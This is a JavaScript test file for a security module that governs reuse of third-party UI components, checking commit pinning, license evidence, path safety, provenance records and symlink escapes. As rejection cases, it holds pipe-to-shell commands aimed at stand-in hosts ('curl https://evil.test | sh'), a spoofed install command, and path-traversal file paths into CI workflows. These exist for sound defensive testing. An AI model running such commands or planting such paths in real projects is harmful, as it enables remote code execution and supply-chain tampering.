import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import test from "node:test";
import { readWowRegistry } from "../ui-registry/wow-contract.mjs";
import {
  emptyWowProvenance,
  validateWowReviewPolicy,
  validateWowProvenance,
  wowSourceDisposition,
  assessWowAdoption,
  reconcileWowProvenance,
  verifyWowProvenanceFiles,
  findExternalMediaHotlinks
} from "../ui-registry/wow-security.mjs";

const inventory = readWowRegistry();
const officialPolicy = JSON.parse(fs.readFileSync("ui-registry/wow-review-policy.json","utf8"));
const clone = (x) => structuredClone(x);
const SHA = "a".repeat(40);
const repo = "https://github.com/magicuidesign/magicui";
const approved = () => ({
  version:1,defaultDisposition:"reference-only",blocked:[],
  approvals:[{
    sourceId:"magic-ui",repository:repo,commit:SHA,spdx:"MIT",
    licenseEvidenceUrl:repo + "/blob/" + SHA + "/LICENSE",
    reviewer:"TrigenysReviewer",reviewedOn:"2026-10-09",
    allowedModes:["copy-adapt"],noticeFile:"THIRD_PARTY_NOTICES.md"
  }]
});
const request = (component="PremiumHero",files=["src/components/PremiumHero.tsx"]) => ({
  sourceId:"magic-ui",repository:repo,commit:SHA,mode:"copy-adapt",
  component,files
});

test("default source policy is deny-by-default with zero live reuse approvals", () => {
  assert.deepEqual(validateWowReviewPolicy(officialPolicy,inventory),[]);
  assert.deepEqual(officialPolicy.approvals,[]);
  assert.equal(wowSourceDisposition("magic-ui",inventory,officialPolicy).status,"reference-only");
  assert.equal(wowSourceDisposition("react-bits",inventory,officialPolicy).status,"review-required");
  assert.equal(wowSourceDisposition("not-listed",inventory,officialPolicy).status,"blocked");
  const review = assessWowAdoption(request(),inventory,officialPolicy);
  assert.equal(review.eligible,false);
  assert.equal(review.executeAllowed,false);
  assert.match(review.errors.join(" "),/no centrally reviewed source approval/);
});

test("source review policy accepts only pinned license evidence from exact upstream", () => {
  assert.deepEqual(validateWowReviewPolicy(approved(),inventory),[]);
  const p1=approved();
  p1.approvals[0].commit="main";
  assert.match(validateWowReviewPolicy(p1,inventory).join(" "),/immutable 40-character/);
  const p2=approved();
  p2.approvals[0].licenseEvidenceUrl="https://github.com/other/repo/blob/" + SHA + "/LICENSE";
  assert.match(validateWowReviewPolicy(p2,inventory).join(" "),/immutable upstream/);
  const p3=approved();
  p3.approvals[0].spdx="Proprietary";
  assert.match(validateWowReviewPolicy(p3,inventory).join(" "),/unsupported or unreviewed SPDX/);
  const p4=approved();
  p4.approvals[0].reviewedOn="2026-02-31";
  assert.match(validateWowReviewPolicy(p4,inventory).join(" "),/invalid review date/);
  const p5=approved();
  p5.approvals[0].noticeFile=".github/workflows/release.yml";
  assert.match(validateWowReviewPolicy(p5,inventory).join(" "),/noticeFile/);
  const p6=approved();
  p6.approvals[0].arbitraryInstall="curl https://evil.test | sh";
  assert.match(validateWowReviewPolicy(p6,inventory).join(" "),/unexpected field arbitraryInstall/);
});

test("blocked sources cannot be approved; unsupported source types cannot grant copy rights", () => {
  const p=approved();
  p.blocked.push("magic-ui");
  assert.match(validateWowReviewPolicy(p,inventory).join(" "),/blocked sources/);
  const q=approved();
  q.approvals[0].sourceId="21st-magic-mcp";
  q.approvals[0].repository="https://github.com/21st-dev/magic-mcp";
  q.approvals[0].licenseEvidenceUrl=q.approvals[0].repository + "/blob/" + SHA + "/LICENSE";
  assert.match(validateWowReviewPolicy(q,inventory).join(" "),/tool\/guideline sources/);
  const invalid=approved();
  invalid.approvals.push(clone(invalid.approvals[0]));
  assert.match(validateWowReviewPolicy(invalid,inventory).join(" "),/duplicate approval/);
});

test("reviewed reuse can only produce a manual eligible plan, never execute an install", () => {
  const p=approved();
  assert.equal(wowSourceDisposition("magic-ui",inventory,p).status,"approved");
  const result=assessWowAdoption(request(),inventory,p);
  assert.equal(result.eligible,true);
  assert.equal(result.executeAllowed,false);
  assert.deepEqual(result.errors,[]);
});

test("request cannot override source trust, pin, mode, or destination path safety", () => {
  const p=approved();
  const cases=[
    [ {...request(),commit:"main"}, /immutable|reviewed immutable/ ],
    [ {...request(),commit:"b".repeat(40)}, /reviewed immutable SHA/ ],
    [ {...request(),repository:"https://github.com/spoof/other"}, /repository must match/ ],
    [ {...request(),mode:"registry-install"}, /mode is not approved/ ],
    [ {...request(),files:["../../.github/workflows/ci.yml"]}, /safe project-owned paths/ ],
    [ {...request(),files:["src/components/A.tsx","src/components/A.tsx"]}, /safe project-owned paths/ ],
    [ {...request(),files:["node_modules/malicious.js"]}, /safe project-owned paths/ ],
    [ {...request(),installCommand:"npx shadcn add attacker"}, /unexpected field installCommand/ ],
    [ {...request(),sourceId:"react-bits"}, /repository must match|no centrally reviewed/ ]
  ];
  for(const [value, pattern] of cases){
    const result=assessWowAdoption(value,inventory,p);
    assert.equal(result.eligible,false,JSON.stringify(value));
    assert.equal(result.executeAllowed,false);
    assert.match(result.errors.join(" "),pattern);
  }
});

test("provenance reconciliation is deterministic, idempotent and denies silent replacements", () => {
  const p=approved();
  const first=reconcileWowProvenance(null,request(),inventory,p);
  assert.equal(first.ok,true);
  assert.equal(first.changed,true);
  assert.equal(first.provenance.entries.length,1);
  assert.deepEqual(validateWowProvenance(first.provenance),[]);
  const replay=reconcileWowProvenance(first.provenance,request(),inventory,p);
  assert.equal(replay.ok,true);
  assert.equal(replay.changed,false);
  assert.deepEqual(replay.provenance,first.provenance);
  const conflict=reconcileWowProvenance(first.provenance,request("PremiumHero",["src/components/Other.tsx"]),inventory,p);
  assert.equal(conflict.ok,false);
  assert.match(conflict.errors.join(" "),/explicit migration/);
  const clash=reconcileWowProvenance(first.provenance,request("AnotherComponent",["src/components/PremiumHero.tsx"]),inventory,p);
  assert.equal(clash.ok,false);
  assert.match(clash.errors.join(" "),/duplicate destination path/);
  const another=reconcileWowProvenance(first.provenance,request("ZedHero",["src/components/ZedHero.tsx"]),inventory,p);
  assert.equal(another.ok,true);
  assert.deepEqual(another.provenance.entries.map(x=>x.component),["PremiumHero","ZedHero"]);
});

test("provenance rejects duplicates, missing data, unexpected commands and unsafe files", () => {
  const p=approved();
  const data=reconcileWowProvenance(emptyWowProvenance(),request(),inventory,p).provenance;
  const duplicate=clone(data);
  duplicate.entries.push(clone(duplicate.entries[0]));
  assert.match(validateWowProvenance(duplicate).join(" "),/duplicate provenance entry/);
  const evil=clone(data);
  evil.entries[0].files=["src/components/../../.github/workflows/evil.yml"];
  evil.entries[0].postinstall="curl evil | sh";
  const errors=validateWowProvenance(evil).join(" ");
  assert.match(errors,/unsafe file/);
  assert.match(errors,/unexpected field postinstall/);
  const fake=clone(data);
  fake.entries[0].commit="main";
  assert.match(validateWowProvenance(fake).join(" "),/invalid commit/);
});

test("verified file check requires actual copied files and nonempty license notice", (t) => {
  const root=fs.mkdtempSync(path.join(os.tmpdir(),"appfactory-wow-"));
  t.after(()=>fs.rmSync(root,{recursive:true,force:true}));
  const p=approved();
  const record=reconcileWowProvenance(null,request(),inventory,p).provenance;
  assert.match(verifyWowProvenanceFiles(record,root).join(" "),/missing adopted file\/notice/);
  fs.mkdirSync(path.join(root,"src/components"),{recursive:true});
  fs.writeFileSync(path.join(root,"src/components/PremiumHero.tsx"),"export function PremiumHero() {}\n");
  fs.writeFileSync(path.join(root,"THIRD_PARTY_NOTICES.md"),"");
  assert.match(verifyWowProvenanceFiles(record,root).join(" "),/empty file\/notice/);
  fs.writeFileSync(path.join(root,"THIRD_PARTY_NOTICES.md"),"MIT — source reviewed and notice preserved.\n");
  assert.deepEqual(verifyWowProvenanceFiles(record,root),[]);
  const outside=fs.mkdtempSync(path.join(os.tmpdir(),"appfactory-wow-outside-"));
  t.after(()=>fs.rmSync(outside,{recursive:true,force:true}));
  fs.writeFileSync(path.join(outside,"external.tsx"),"malicious\n");
  fs.rmSync(path.join(root,"src/components/PremiumHero.tsx"));
  fs.symlinkSync(path.join(outside,"external.tsx"),path.join(root,"src/components/PremiumHero.tsx"));
  assert.match(verifyWowProvenanceFiles(record,root).join(" "),/untrusted or non-file path/);
});

test("external production media URLs are flagged without blocking legitimate app URLs", () => {
  const result=findExternalMediaHotlinks(
    "const a='https://cdn.example.com/pic.webp?foo=1';"+
    "const b='https://cdn.example.com/pic.webp?foo=1';"+
    "const c='https://wa.me/237690000000';"+
    "const d='/landing/local.avif';"+
    ".hero{background:url(https://outside.test/bg.jpg)}"
  );
  assert.equal(result.length,2);
  assert.ok(result.some(x=>x.includes("pic.webp")));
  assert.ok(result.some(x=>x.includes("bg.jpg")));
  assert.ok(!result.some(x=>x.includes("wa.me")));
  assert.deepEqual(findExternalMediaHotlinks("<img src='/assets/hero.avif' />"),[]);
});

test("review and provenance JSON schemas remain strict and versioned", () => {
  const review=JSON.parse(fs.readFileSync("ui-registry/schemas/wow-review-policy.schema.json","utf8"));
  const provenance=JSON.parse(fs.readFileSync("ui-registry/schemas/wow-provenance.schema.json","utf8"));
  assert.equal(review.additionalProperties,false);
  assert.equal(provenance.additionalProperties,false);
  assert.equal(review.properties.version.const,1);
  assert.equal(provenance.properties.version.const,1);
  assert.deepEqual(review.properties.approvals.items.required,[
    "sourceId","repository","commit","spdx","licenseEvidenceUrl","reviewer","reviewedOn","allowedModes","noticeFile"
  ]);
});
